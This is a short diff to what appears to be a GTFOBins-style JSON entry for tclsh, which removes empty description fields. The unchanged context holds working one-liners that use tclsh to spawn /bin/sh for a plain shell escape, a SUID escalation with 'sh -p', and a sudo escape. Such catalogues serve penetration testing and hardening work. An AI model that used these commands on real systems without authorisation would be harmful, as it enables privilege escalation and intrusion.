@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
       }
     ],
@@ -14,13 +14,13 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
       }
     ]
